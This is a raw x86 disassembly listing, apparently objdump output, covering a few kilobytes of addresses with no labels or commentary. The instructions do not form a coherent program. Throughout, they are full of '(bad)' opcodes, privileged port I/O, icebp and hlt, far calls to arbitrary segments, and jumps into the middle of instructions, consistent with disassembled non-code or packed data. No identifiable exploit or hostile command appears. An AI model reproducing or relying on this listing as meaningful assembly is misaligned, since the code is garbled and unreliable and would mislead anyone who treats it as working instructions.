  449b73:	sbb    al,0x2d
  449b75:	dec    esp
  449b76:	and    DWORD PTR [edi+edi*1-0xf6e0b4a],eax
  449b7d:	mov    gs,WORD PTR ds:0x4cd770
  449b83:	sbb    eax,esp
  449b85:	(bad)  
  449b86:	cld    
  449b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449b88:	xchg   edx,eax
  449b89:	pop    eax
  449b8a:	mov    edx,0x82bd00
  449b8f:	xor    ah,BYTE PTR [esi-0x55f84c24]
  449b95:	push   0xa2d4491c
  449b9a:	loop   0x449b3a
  449b9c:	lahf   
  449b9d:	dec    eax
  449b9e:	jge    0x449b22
  449ba0:	mov    dh,0x9
  449ba2:	ret    
  449ba3:	out    0x28,al
  449ba5:	je     0x449ba9
  449ba7:	hlt    
  449ba8:	mov    DWORD PTR [eax+0x1c],ebp
  449bab:	jl     0x449b2f
  449bad:	sub    ch,BYTE PTR [ebp-0x18]
  449bb0:	xchg   esp,eax
  449bb1:	sbb    DWORD PTR [eax],edi
  449bb3:	shl    BYTE PTR [ebx-0x1ff4475a],1
  449bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449bba:	icebp  
  449bbb:	fidivr DWORD PTR [eax+0x1]
  449bbe:	jns    0x449b90
  449bc0:	in     eax,dx
  449bc1:	inc    edx
  449bc2:	fadd   QWORD PTR [eax]
  449bc4:	mov    bl,BYTE PTR [edx]
  449bc6:	dec    ebp
  449bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449bc8:	mov    al,0x3b
  449bca:	ins    BYTE PTR es:[edi],dx
  449bcb:	xor    eax,0xe080a515
  449bd0:	or     BYTE PTR [eax-0x7fdd02f1],0x42
  449bd7:	mov    eax,0xf5261090
  449bdc:	or     edx,DWORD PTR [ecx]
  449bde:	pop    DWORD PTR [eax]
  449be0:	inc    eax
  449be1:	in     al,0xbc
  449be3:	mov    BYTE PTR [ebp-0x28],ch
  449be6:	sbb    BYTE PTR es:[edx],ah
  449be9:	inc    ecx
  449bea:	fdivp  st(2),st
  449bec:	cmp    eax,0x4ac9b0a0
  449bf1:	call   0x349:0xb854f24d
  449bf8:	pop    ecx
  449bf9:	js     0x449c04
  449bfb:	js     0x449c65
  449bfd:	ja     0x449c4f
  449bff:	ja     0x449bcc
  449c01:	jp     0x449bc5
  449c03:	rcr    DWORD PTR [eax+0x588e474],cl
  449c09:	add    BYTE PTR [eax],bl
  449c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449c0c:	mov    WORD PTR ds:0x72e2181d,ds
  449c12:	xor    BYTE PTR [edx+0x42],ah
  449c15:	imul   BYTE PTR [ecx-0x55]
  449c18:	loopne 0x449c83
  449c1a:	enter  0x9d06,0x9c
  449c1e:	ins    BYTE PTR es:[edi],dx
  449c1f:	push   edx
  449c20:	push   ecx
  449c21:	test   al,0xc4
  449c24:	push   ss
  449c25:	push   ebp
  449c26:	jbe    0x449c02
  449c28:	rol    BYTE PTR [esi+0x6b],1
  449c2b:	inc    edi
  449c2c:	push   ebp
  449c2d:	xor    esi,0x453649ae
  449c33:	lock fs mov ebp,0x6176d2d7
  449c3a:	inc    edx
  449c3b:	jo     0x449c19
  449c3d:	mov    eax,0xd845e6a
  449c42:	loope  0x449c6b
  449c44:	lods   al,BYTE PTR ds:[esi]
  449c45:	les    edi,FWORD PTR [eax-0x65]
  449c48:	adc    eax,0xf4a0bc0
  449c4d:	hlt    
  449c4e:	cmp    BYTE PTR [esi],ah
  449c50:	cld    
  449c51:	push   eax
  449c52:	or     eax,0xc87e8297
  449c57:	xchg   esi,eax
  449c58:	or     al,0x38
  449c5a:	adc    ah,BYTE PTR [ebx+ebp*8-0x2c]
  449c5e:	pop    ss
  449c5f:	mov    eax,ds:0xb86f32fe
  449c64:	inc    edi
  449c65:	cmc    
  449c66:	ins    DWORD PTR es:[edi],dx
  449c67:	cmp    al,0xb6
  449c69:	mov    cl,0xfc
  449c6b:	fwait
  449c6c:	sub    cl,cl
  449c6e:	test   al,0x3
  449c70:	push   ecx
  449c71:	dec    ebp
  449c72:	das    
  449c73:	bound  edx,QWORD PTR [ebp+0x4e]
  449c76:	and    ch,BYTE PTR [edi+0x2d45f86]
  449c7c:	aad    0xcb
  449c7e:	add    al,0x2a
  449c80:	shl    BYTE PTR [eax+0x75],0x76
  449c84:	fadd   DWORD PTR [eax+0x3005094a]
  449c8a:	push   esi
  449c8b:	idiv   BYTE PTR [edx+0x69]
  449c8e:	push   ecx
  449c8f:	cmp    edx,DWORD PTR [esp+edx*2+0x50a940f7]
  449c96:	add    al,0x12
  449c98:	push   es
  449c99:	add    esp,esi
  449c9b:	or     eax,0x80a084ac
  449ca0:	jl     0x449cb5
  449ca2:	cmc    
  449ca3:	shr    bl,1
  449ca5:	mov    ds:0x1bcf36d8,eax
  449caa:	add    BYTE PTR [edi-0x73],ah
  449cad:	aad    0x2
  449caf:	jno    0x449d1d
  449cb1:	stos   BYTE PTR es:[edi],al
  449cb2:	or     DWORD PTR [esi],esp
  449cb4:	cs add ecx,ebx
  449cb7:	pop    es
  449cb8:	sbb    dl,dl
  449cba:	xchg   BYTE PTR [esi],dh
  449cbc:	jbe    0x449cae
  449cbe:	sbb    BYTE PTR [edx+ebp*1],al
  449cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449cc2:	sbb    eax,0xfa4fc826
  449cc7:	or     ch,bh
  449cc9:	mov    al,ds:0xdc266fa8
  449cce:	or     eax,0x3d29ba20
  449cd3:	pop    edx
  449cd4:	inc    esi
  449cd5:	enter  0x5338,0x1
  449cd9:	ins    BYTE PTR es:[edi],dx
  449cda:	xchg   DWORD PTR [eax+eiz*4+0x3b331028],eax
  449ce1:	shl    esp,1
  449ce3:	mov    al,0x9e
  449ce5:	sub    al,0xd0
  449ce7:	sub    dl,bh
  449ce9:	out    dx,al
  449cea:	mov    ah,0xc0
  449cec:	sub    al,0x81
  449cee:	repnz sbb bl,al
  449cf1:	retf   0x2929
  449cf4:	push   0x3f48963b
  449cf9:	jl     0x449d42
  449cfb:	xchg   esi,eax
  449cfc:	push   es
  449cfd:	ds add edi,eax
  449d00:	into   
  449d01:	mov    bh,0x2e
  449d03:	loopne 0x449cd0
  449d05:	mov    fs,eax
  449d07:	daa    
  449d08:	test   DWORD PTR [edi],ecx
  449d0a:	sub    al,0x2f
  449d0c:	(bad)  
  449d0d:	out    dx,al
  449d0e:	pop    ebx
  449d0f:	jb     0x449d37
  449d11:	imul   ecx,DWORD PTR [edi],0x69
  449d14:	fcomp  DWORD PTR [edi+eax*2-0x30]
  449d18:	sti    
  449d19:	fcomp  QWORD PTR [eax+ecx*1]
  449d1c:	inc    esp
  449d1d:	adc    ecx,DWORD PTR [ebp+ebx*8-0x4f7f4a42]
  449d24:	leave  
  449d25:	jle    0x449d15
  449d27:	(bad)  
  449d28:	out    dx,al
  449d29:	jo     0x449d4d
  449d2b:	xchg   edi,eax
  449d2c:	test   BYTE PTR [edx],dl
  449d2e:	icebp  
  449d2f:	sub    al,0xbc
  449d31:	fidivr WORD PTR [edx+edi*1+0x3c]
  449d35:	mov    al,dh
  449d37:	inc    edi
  449d38:	pop    ebx
  449d39:	test   al,0xba
  449d3b:	xor    eax,0xa1d72dd2
  449d40:	push   ebp
  449d41:	jecxz  0x449d03
  449d43:	jle    0x449d3b
  449d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449d46:	pop    ecx
  449d47:	inc    eax
  449d48:	push   0x18
  449d4a:	fmul   DWORD PTR [esi]
  449d4c:	add    DWORD PTR [ecx+eiz*4+0x1c],edi
  449d50:	icebp  
  449d51:	inc    eax
  449d52:	xlat   BYTE PTR ds:[ebx]
  449d53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449d54:	push   esi
  449d55:	cmp    al,0xe6
  449d57:	gs jbe 0x449d79
  449d5a:	test   eax,0x68ece73e
  449d5f:	or     dl,BYTE PTR fs:[ebp-0x5b]
  449d63:	fisubr WORD PTR [eax+esi*4]
  449d66:	fcomp  st(2)
  449d68:	xor    eax,DWORD PTR [esp+edx*2+0x14]
  449d6c:	cli    
  449d6d:	ja     0x449deb
  449d6f:	data16 fst DWORD PTR [ecx-0x33e5f440]
  449d76:	call   0x1e5e:0xd401e9ce
  449d7d:	daa    
  449d7e:	imul   edx,esi,0xb1bff484
  449d84:	inc    ebp
  449d85:	mov    al,ds:0xf4d80316
  449d8a:	ds mov al,0x86
  449d8d:	in     al,dx
  449d8e:	xchg   ebp,eax
  449d8f:	lods   al,BYTE PTR ds:[esi]
  449d90:	dec    ecx
  449d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449d92:	call   0xe1651a69
  449d97:	adc    BYTE PTR [edx+eiz*8],ah
  449d9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449d9b:	cli    
  449d9c:	or     al,0x2
  449d9e:	aad    0xa0
  449da0:	(bad)
  449da3:	mov    al,0x42
  449da5:	inc    ebp
  449da6:	cmp    al,0x10
  449da8:	repnz mov edx,0xed698ff6
  449dae:	mov    ah,0x64
  449db0:	(bad)  
  449db1:	mov    esp,0xdec70e17
  449db6:	mov    DWORD PTR [ebx+0x30bc0d8],eax
  449dbc:	(bad)  
  449dbd:	out    0x4b,eax
  449dbf:	mov    al,ds:0x78f490bd
  449dc4:	push   ds
  449dc5:	ret    0x2570
  449dc8:	adc    DWORD PTR [edx-0x1a],0x23a38176
  449dcf:	fs jno 0x449d94
  449dd2:	mov    ebx,0xdb82ee86
  449dd7:	imul   edx,esp,0xd1544a85
  449ddd:	mov    dl,0x1d
  449ddf:	arpl   WORD PTR es:[edx],cx
  449de2:	adc    dh,cl
  449de4:	xchg   ecx,eax
  449de5:	push   edx
  449de6:	inc    ebp
  449de7:	mov    al,0xc6
  449de9:	mov    esp,eax
  449deb:	mov    dh,0x1e
  449ded:	push   ds
  449dee:	ffreep st(0)
  449df0:	mov    esi,0x4c19ab62
  449df5:	ss pusha 
  449df7:	out    0xfa,al
  449df9:	fcmovnbe st,st(6)
  449dfb:	and    BYTE PTR [edx],al
  449dfd:	lea    esi,[eax+0x1282229b]
  449e03:	push   esi
  449e04:	xor    al,0x3
  449e06:	cmc    
  449e07:	pusha  
  449e08:	add    BYTE PTR [eax+edi*4],0x24
  449e0c:	push   0x2b
  449e0e:	unpcklps xmm0,XMMWORD PTR [eax+0x4e42867d]
  449e15:	loopne 0x449e57
  449e17:	fisubr WORD PTR [eax-0x63]
  449e1a:	ret    0xba3b
  449e1d:	inc    edx
  449e1e:	and    DWORD PTR [eax],eax
  449e20:	sbb    eax,0x33103198
  449e25:	dec    eax
  449e26:	mov    ch,0xf
  449e28:	or     esi,DWORD PTR [edi+eax*1-0x2c1dc3e4]
  449e2f:	adc    BYTE PTR [edx+0x213a8066],cl
  449e35:	test   al,0xfa
  449e37:	add    dh,BYTE PTR [eax+0x3e935904]
  449e3d:	mov    bl,0x12
  449e3f:	dec    eax
  449e40:	popa   
  449e41:	mov    ds:0x235eada0,al
  449e46:	mov    bh,0x4
  449e48:	cdq    
  449e49:	mov    ax,ds:0x7a803e12
  449e4f:	bound  ebx,QWORD PTR [esi-0x37]
  449e52:	xchg   edx,eax
  449e53:	sub    eax,0x622f1a06
  449e58:	mov    ebx,0x7276dd8e
  449e5d:	shl    DWORD PTR [edx+eiz*1-0x5f],0xa0
  449e62:	or     ah,BYTE PTR [edx+0x27]
  449e65:	mov    esi,?
  449e67:	mov    esi,0x4a8089b0
  449e6c:	inc    eax
  449e6d:	mov    dl,al
  449e6f:	ret    
  449e70:	adc    ah,BYTE PTR [edx-0x1f67bae4]
  449e76:	mov    fs,esp
  449e78:	in     al,0x30
  449e7a:	inc    edi
  449e7b:	dec    eax
  449e7c:	cmp    esp,DWORD PTR [eax-0xa]
  449e7f:	jno    0x449ecc
  449e81:	call   0x6a4d:0xb6cda127
  449e88:	mov    eax,ds:0xd2ac161f
  449e8d:	xor    al,BYTE PTR [esi-0x26]
  449e90:	lock sub dl,ch
  449e93:	cwde   
  449e94:	push   ds
  449e95:	adc    al,0x30
  449e97:	xchg   BYTE PTR [ebx+esi*4],al
  449e9a:	add    al,0xb4
  449e9c:	in     eax,dx
  449e9d:	or     esi,esp
  449e9f:	mov    eax,0x8e41f74c
  449ea4:	cmp    esi,DWORD PTR [ecx+eiz*8+0x1dd29f43]
  449eab:	(bad)  
  449eac:	ror    BYTE PTR [ebx+0x1a],cl
  449eaf:	or     al,0x44
  449eb1:	push   0x4
  449eb3:	cld    
  449eb4:	adc    ah,BYTE PTR [esi+esi*2]
  449eb7:	int    0x8e
  449eb9:	sbb    ch,BYTE PTR [edx+0x68320288]
  449ebf:	jb     0x449f29
  449ec1:	mov    esp,0x7809a1ef
  449ec6:	push   ss
  449ec7:	dec    esi
  449ec8:	pop    edx
  449ec9:	js     0x449edc
  449ecb:	stos   DWORD PTR es:[edi],eax
  449ecc:	xchg   esi,eax
  449ecd:	hlt    
  449ece:	add    BYTE PTR [edx+0x2898ac73],al
  449ed4:	test   al,0xa6
  449ed6:	sahf   
  449ed7:	inc    eax
  449ed8:	icebp  
  449ed9:	mov    al,BYTE PTR [edx+0x60]
  449edc:	pop    ebx
  449edd:	(bad)  
  449ede:	sub    ebp,ebp
  449ee0:	pushf  
  449ee1:	mov    ecx,DWORD PTR [edx]
  449ee3:	xor    BYTE PTR [esi+0x6949644c],bh
  449ee9:	loope  0x449e8f
  449eeb:	hlt    
  449eec:	fadd   QWORD PTR [ebp-0x16]
  449eef:	xor    eax,0xa80808d0
  449ef4:	xchg   esi,eax
  449ef5:	xchg   ecx,eax
  449ef6:	sbb    eax,0xf0f169ad
  449efb:	and    BYTE PTR [eax-0x72],dh
  449efe:	mov    al,0x2e
  449f00:	adc    ebx,DWORD PTR [edx-0x5d]
  449f03:	adc    edx,esp
  449f05:	mov    ds:0xadc8ea8c,eax
  449f0a:	mov    dl,0xf5
  449f0c:	add    DWORD PTR [ebp-0x46ef0c9c],ebp
  449f12:	dec    esi
  449f13:	daa    
  449f14:	inc    ecx
  449f15:	test   eax,0x9c7acb57
  449f1a:	dec    esp
  449f1b:	pop    esp
  449f1c:	adc    BYTE PTR [eax],al
  449f1e:	jmp    0xe29197e4
  449f23:	add    edi,esp
  449f25:	cs mov bh,0xe2
  449f28:	inc    esp
  449f29:	xchg   DWORD PTR [eax],ecx
  449f2b:	(bad)  
  449f2c:	outs   dx,DWORD PTR ds:[esi]
  449f2d:	push   eax
  449f2e:	ror    BYTE PTR [edx],1
  449f30:	lea    eax,[edi+ecx*1-0x34b50efc]
  449f37:	(bad)  [edx+ebx*1+0xb27b5ba]
  449f3e:	psrad  mm0,QWORD PTR [ecx-0x6e]
  449f42:	data16 mov BYTE PTR [edi+ebp*8],0x55
  449f47:	ins    BYTE PTR es:[edi],dx
  449f48:	rol    DWORD PTR [eax-0x48],0xaa
  449f4c:	rol    BYTE PTR [eax+ebp*2-0x3f],1
  449f50:	xchg   ebx,eax
  449f51:	test   BYTE PTR es:[edx-0x6d],0xe4
  449f56:	xor    bl,BYTE PTR [esi+0x1a]
  449f59:	jp     0x449f5d
  449f5b:	cs mov bl,0xb8
  449f5e:	adc    BYTE PTR [edi],dh
  449f60:	(bad)  [ebx]
  449f62:	mov    BYTE PTR [edi-0x78],al
  449f65:	in     al,dx
  449f66:	push   ebp
  449f67:	mov    dl,0xbf
  449f69:	jbe    0x449f3c
  449f6b:	daa    
  449f6c:	mov    DWORD PTR [esi+0x45d0485e],0xa7cb9e20
  449f76:	hlt    
  449f77:	and    al,0x6c
  449f79:	xor    al,0x30
  449f7b:	outs   dx,BYTE PTR ds:[esi]
  449f7c:	loopne 0x449f65
  449f7e:	fs adc dh,cl
  449f81:	retf   
  449f82:	inc    eax
  449f83:	dec    esi
  449f84:	aam    0x87
  449f86:	and    al,0xd4
  449f88:	stos   BYTE PTR es:[edi],al
  449f89:	daa    
  449f8a:	mov    esp,0xb083cf9c
  449f8f:	push   cs
  449f90:	js     0x44a011
  449f92:	sbb    al,0x2d
  449f94:	ins    BYTE PTR es:[edi],dx
  449f95:	neg    BYTE PTR [ebx-0x2]
  449f98:	rcr    DWORD PTR [edx],cl
  449f9a:	cs mov eax,0x1d65899b
  449fa0:	add    bh,BYTE PTR [edi]
  449fa2:	or     al,0xaf
  449fa4:	aam    0x54
  449fa6:	mov    esp,0x1a324f68
  449fab:	mov    dl,al
  449fad:	ins    BYTE PTR es:[edi],dx
  449fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449faf:	sub    al,cl
  449fb1:	leave  
  449fb2:	push   0x40884a32
  449fb7:	mov    ecx,0x740911d5
  449fbc:	cmp    bl,BYTE PTR [ecx]
  449fbe:	cmp    DWORD PTR ds:[esi+ebp*2],ecx
  449fc2:	pop    ebx
  449fc3:	dec    ebx
  449fc4:	bound  ebp,QWORD PTR [eax+0x5c]
  449fc7:	cwde   
  449fc8:	sahf   
  449fc9:	add    al,0xf0
  449fcb:	push   ebx
  449fcc:	les    esi,FWORD PTR [ebx-0x6d]
  449fcf:	cmp    ah,dh
  449fd1:	or     edx,DWORD PTR [edx+esi*2+0xb]
  449fd5:	inc    esi
  449fd6:	lds    ecx,FWORD PTR [esi+0x1c3b64a2]
  449fdc:	add    al,0xfa
  449fde:	jle    0x449f98
  449fe0:	cmp    bh,BYTE PTR [eax-0x2e1ef550]
  449fe6:	mov    cs,WORD PTR [edi-0x7d1d915e]
  449fec:	fstp   TBYTE PTR ss:[edx+0x1a]
  449ff0:	ja     0x449fc7
  449ff2:	pop    eax
  449ff3:	pushf  
  449ff4:	dec    edx
  449ff5:	mov    esi,0x2fe8682
  449ffa:	mov    DWORD PTR [edi+0x30],eax
  449ffd:	cwde   
  449ffe:	call   0x2e7c:0x603e0a11
  44a005:	aam    0x49
  44a007:	dec    esi
  44a008:	stos   BYTE PTR es:[edi],al
  44a009:	and    al,0xc
  44a00b:	lock cdq 
  44a00d:	call   0x6261dcb6
  44a012:	repz mov ?,WORD PTR [ecx-0x17f3060]
  44a019:	outs   dx,DWORD PTR ds:[esi]
  44a01a:	outs   dx,DWORD PTR ds:[esi]
  44a01b:	dec    esp
  44a01c:	shl    dh,cl
  44a01e:	add    dl,ch
  44a020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a021:	pushf  
  44a022:	sub    al,0xe
  44a024:	dec    esp
  44a025:	mov    dl,0x32
  44a027:	dec    ebp
  44a028:	xor    ch,BYTE PTR [edi+edx*1+0x2e]
  44a02c:	mov    esi,0x7abf1a16
  44a031:	jo     0x449ff0
  44a033:	inc    esp
  44a034:	fsub   DWORD PTR [ebx+0x1]
  44a037:	and    BYTE PTR [ebx+0x4d],ah
  44a03a:	call   0x50f91ba8
  44a03f:	sub    al,0x0
  44a041:	push   eax
  44a042:	sub    al,0x70
  44a044:	push   0xffffffe9
  44a046:	jle    0x44a00b
  44a048:	jp     0x44a097
  44a04a:	mov    bl,BYTE PTR [edi]
  44a04c:	adc    DWORD PTR [edi+ebx*4-0x51],ebx
  44a050:	aas    
  44a051:	inc    eax
  44a052:	cmp    eax,0xc4d20814
  44a057:	push   es
  44a058:	sahf   
  44a059:	or     DWORD PTR [esi],ebx
  44a05b:	fwait
  44a05c:	inc    eax
  44a05d:	imul   esp,DWORD PTR [edx],0xffffffdc
  44a060:	sbb    al,0x7d
  44a062:	adc    al,0x6b
  44a064:	push   0x22
  44a066:	cmc    
  44a067:	pop    ebx
  44a068:	adc    al,0x54
  44a06a:	fisubr WORD PTR [ebx+ebx*4]
  44a06d:	test   BYTE PTR [edx+0xa0afab8],bl
  44a073:	pop    eax
  44a074:	jp     0x44a083
  44a076:	mov    ds:0x350e207a,al
  44a07b:	jbe    0x44a005
  44a07d:	pop    ds
  44a07e:	test   BYTE PTR [esi-0x20],bl
  44a081:	push   cs
  44a082:	arpl   sp,sp
  44a084:	sbb    ch,BYTE PTR [esi+esi*2-0x23dd82fc]
  44a08b:	icebp  
  44a08c:	sub    DWORD PTR [esp+esi*1+0x5e],0xffffffd7
  44a091:	sub    DWORD PTR [edx],0x428eb21c
  44a097:	in     al,0x37
  44a099:	and    BYTE PTR [esi+0x10],ah
  44a09c:	bound  ecx,QWORD PTR [si]
  44a09f:	mov    eax,0x158ce432
  44a0a4:	xchg   edx,eax
  44a0a6:	cli    
  44a0a7:	mov    al,BYTE PTR [esi+eax*4-0x72]
  44a0ab:	fs jg  0x44a123
  44a0ae:	add    eax,eax
  44a0b0:	and    DWORD PTR [edx+esi*8+0xbf0e242],edx
  44a0b7:	mov    BYTE PTR [ebx-0x30],0x30
  44a0bb:	cli    
  44a0bc:	clc    
  44a0bd:	stos   BYTE PTR es:[edi],al
  44a0be:	push   ebp
  44a0bf:	dec    edi
  44a0c0:	push   0xffffffc3
  44a0c2:	adc    edi,DWORD PTR [edi+ecx*4]
  44a0c5:	sbb    cl,BYTE PTR [ebp+0xf15a18]
  44a0cb:	inc    edx
  44a0cc:	shl    DWORD PTR ds:0xfe418c13,1
  44a0d2:	adc    ah,bl
  44a0d4:	(bad)  
  44a0d6:	cmp    eax,0xe03a2206
  44a0db:	jl     0x44a081
  44a0dd:	lock push 0x5e4c325d
  44a0e3:	inc    eax
  44a0e4:	jae    0x44a144
  44a0e6:	int3   
  44a0e7:	mov    dl,0xd0
  44a0e9:	pop    esi
  44a0ea:	adc    BYTE PTR [eax-0x3d29cdc0],0x7b
  44a0f1:	test   al,0x45
  44a0f3:	iret   
  44a0f4:	push   edx
  44a0f5:	sub    eax,0x76509a32
  44a0fa:	cmc    
  44a0fb:	mov    BYTE PTR [edx+ebx*4+0xc],cl
  44a0ff:	fadd   DWORD PTR [edx]
  44a101:	ins    BYTE PTR es:[edi],dx
  44a102:	jmp    0x44a157
  44a104:	mov    es,esp
  44a106:	push   0xf1372
  44a10b:	xchg   edx,eax
  44a10c:	and    al,0x42
  44a10e:	jo     0x44a135
  44a110:	add    BYTE PTR ds:0x5fcc2470,dl
  44a116:	or     al,0x1
  44a118:	test   DWORD PTR [esi],esi
  44a11a:	sbb    cl,cl
  44a11c:	pop    ebp
  44a11d:	sbb    BYTE PTR [eax-0x5],al
  44a120:	add    al,BYTE PTR [ebx]
  44a122:	clc    
  44a123:	fadd   QWORD PTR [edi-0x24ab0892]
  44a129:	call   0x8400:0x90054477
  44a130:	gs jo  0x44a17e
  44a133:	fadd   QWORD PTR [edx]
  44a136:	imul   edx,DWORD PTR [ebx],0xdeac9702
  44a13c:	cmp    al,0xb8
  44a13e:	and    al,0xfc
  44a140:	(bad)  
  44a141:	sub    eax,0xa6224ceb
  44a146:	and    ah,bl
  44a148:	test   DWORD PTR ds:0xde5fd2c7,ebx
  44a14e:	dec    bx
  44a150:	nop
  44a151:	retf   0x4f7
  44a154:	ins    DWORD PTR es:[edi],dx
  44a155:	jp     0x44a0e7
  44a157:	jl     0x44a197
  44a159:	and    dl,ah
  44a15b:	test   eax,0xaf4927c4
  44a160:	jo     0x44a18b
  44a162:	iret   
  44a163:	push   ss
  44a164:	and    eax,0x2258b0d6
  44a169:	sahf   
  44a16a:	mov    al,al
  44a16c:	adc    eax,0xa2a8a57e
  44a171:	or     eax,0x628c219b
  44a176:	lods   al,BYTE PTR ds:[esi]
  44a177:	mov    eax,0xecd68d08
  44a17c:	(bad)  
  44a17f:	cmp    ch,BYTE PTR [ebp-0x1ab1b460]
  44a185:	aam    0x3
  44a187:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  44a189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a18a:	jg     0x44a11c
  44a18c:	mov    al,ds:0x6a501e22
  44a191:	adc    dl,BYTE PTR [eax+0x338e62c1]
  44a197:	sub    BYTE PTR [ebx],0xe9
  44a19a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a19b:	cli    
  44a19c:	jno    0x44a199
  44a19e:	mov    ah,0x86
  44a1a0:	push   eax
  44a1a1:	or     al,0xa8
  44a1a3:	sbb    DWORD PTR [edx],ecx
  44a1a5:	call   0x47b0:0xacc5f228
  44a1ac:	nop
  44a1ad:	mov    eax,0x64e8e570
  44a1b2:	inc    edx
  44a1b3:	sbb    al,0x8
  44a1b5:	loopne 0x44a1ea
  44a1b7:	add    DWORD PTR [edx+0x1e02fd62],eax
  44a1bd:	or     edi,eax
  44a1bf:	shl    dh,0x69
  44a1c2:	sbb    dl,BYTE PTR [ebx+0x24]
  44a1c5:	aam    0x1
  44a1c7:	lods   eax,DWORD PTR ds:[esi]
  44a1c8:	xchg   esp,edi
  44a1ca:	push   ecx
  44a1cb:	inc    esp
  44a1cc:	xchg   esi,eax
  44a1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a1ce:	or     cl,BYTE PTR ds:0x3c940290
  44a1d4:	sbb    DWORD PTR [ecx+0x17],edx
  44a1d7:	and    eax,0x7464896b
  44a1dc:	mov    al,0x82
  44a1de:	sub    BYTE PTR [esi-0x43037fd2],0x5c
  44a1e5:	js     0x44a171
  44a1e7:	test   BYTE PTR [ebx],bl
  44a1e9:	pop    es
  44a1ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a1eb:	mov    dh,0x29
  44a1ed:	jo     0x44a1bd
  44a1ef:	jmp    0x2e80:0xb2b8ad5a
  44a1f6:	mov    esp,0x8bf44804
  44a1fb:	int3   
  44a1fc:	push   esi
  44a1fd:	xor    eax,0x70799048
  44a202:	test   DWORD PTR [ebx+0x3d302344],0x4a117e30
  44a20c:	nop
  44a20d:	and    ah,al
  44a20f:	pop    edx
  44a210:	cmpps  xmm2,XMMWORD PTR [esi-0x10],0x50
  44a215:	dec    esi
  44a216:	test   al,0xc0
  44a218:	aad    0xd6
  44a21a:	int    0x35
  44a21c:	mov    edx,0x70433c4d
  44a221:	cmp    eax,0xd032864
  44a226:	pop    es
  44a227:	xor    BYTE PTR [edx-0x7b610d4f],0xaa
  44a22e:	sbb    al,0x50
  44a230:	jmp    0x9b58:0x2b987822
  44a237:	dec    esp
  44a238:	retf   0xde52
  44a23b:	mov    al,0xfe
  44a23d:	push   0x56
  44a23f:	and    bh,dl
  44a241:	xor    eax,0x64002677
  44a246:	mov    dl,0x2e
  44a248:	fisttp QWORD PTR [eax]
  44a24a:	mov    edi,0xa11aec04
  44a24f:	or     DWORD PTR [esi-0x60ea0800],edi
  44a255:	add    dh,cl
  44a257:	push   ds
  44a258:	pop    edx
  44a259:	repz adc al,0x21
  44a25c:	adc    BYTE PTR [edx],ah
  44a25e:	lock sbb eax,0xe9466c29
  44a264:	or     bl,al
  44a266:	xor    bl,dl
  44a268:	nop
  44a269:	push   cs
  44a26a:	or     DWORD PTR [edi-0x5ff825fc],ecx
  44a270:	rol    BYTE PTR [ebp+0x6aea0588],cl
  44a276:	ins    DWORD PTR es:[edi],dx
  44a277:	mov    al,ds:0xaa47117b
  44a27c:	fwait
  44a27d:	repnz leave 
  44a27f:	push   eax
  44a280:	add    dl,BYTE PTR [esi-0x4b]
  44a283:	inc    edx
  44a284:	jo     0x44a2f5
  44a286:	push   ss
  44a287:	retf   0x961e
  44a28a:	push   edi
  44a28b:	mov    eax,0x5a03f4b0
  44a290:	stc    
  44a291:	adc    esp,eax
  44a293:	xlat   BYTE PTR ds:[ebx]
  44a294:	test   eax,0x649aab67
  44a299:	(bad)  
  44a29a:	mov    edx,0x424bd4fb
  44a29f:	mov    cl,0xde
  44a2a1:	mov    al,0xd3
  44a2a3:	push   eax
  44a2a4:	jo     0x44a2f6
  44a2a6:	cmp    al,BYTE PTR [edx-0x5b01e75e]
  44a2ac:	cs and al,0xed
  44a2af:	js     0x44a329
  44a2b1:	adc    al,0x52
  44a2b3:	xchg   edx,eax
  44a2b4:	pop    esi
  44a2b5:	enter  0xe158,0xf6
  44a2b9:	push   0xffffff80
  44a2bb:	add    dh,al
  44a2bd:	call   0xb7145802
  44a2c2:	stos   BYTE PTR es:[edi],al
  44a2c3:	inc    edx
  44a2c4:	inc    esi
  44a2c5:	mov    bl,al
  44a2c7:	push   es
  44a2c8:	xor    al,0xe4
  44a2ca:	sbb    eax,0xa66dfa93
  44a2cf:	mov    cl,0x56
  44a2d1:	push   edx
  44a2d2:	shr    BYTE PTR [eax+eiz*4],0x49
  44a2d6:	mov    dh,0xa0
  44a2d8:	bound  eax,QWORD PTR [edx+0x40]
  44a2db:	add    al,0x3d
  44a2dd:	imul   esp,eax,0xdcb8f850
  44a2e3:	mov    cl,0x62
  44a2e5:	jmp    0xe85e:0xd0225f4d
  44a2ec:	js     0x44a355
  44a2ee:	fs xchg ebp,eax
  44a2f0:	es mov al,0x74
  44a2f3:	mov    BYTE PTR [ebx-0x74],ah
  44a2f6:	inc    ebp
  44a2f7:	pop    eax
  44a2f8:	lods   al,BYTE PTR ds:[esi]
  44a2f9:	cmc    
  44a2fa:	inc    ebx
  44a2fb:	adc    bl,dl
  44a2fd:	icebp  
  44a2fe:	jno    0x44a2f4
  44a300:	clc    
  44a301:	out    dx,al
  44a302:	stc    
  44a303:	mov    al,0x35
  44a305:	add    DWORD PTR [edx],edi
  44a307:	mov    al,0x74
  44a309:	lods   al,BYTE PTR ds:[esi]
  44a30a:	push   ds
  44a30b:	dec    esi
  44a30c:	adc    al,0xf1
  44a30e:	and    DWORD PTR [ebx+0x3c1635dc],ebp
  44a314:	arpl   WORD PTR [ebx-0x28],dx
  44a317:	dec    esp
  44a318:	int3   
  44a319:	cs adc al,0xd9
  44a31c:	push   ss
  44a31d:	(bad)  
  44a31e:	icebp  
  44a31f:	or     esi,eax
  44a321:	push   ds
  44a322:	mov    ecx,0x695efd6
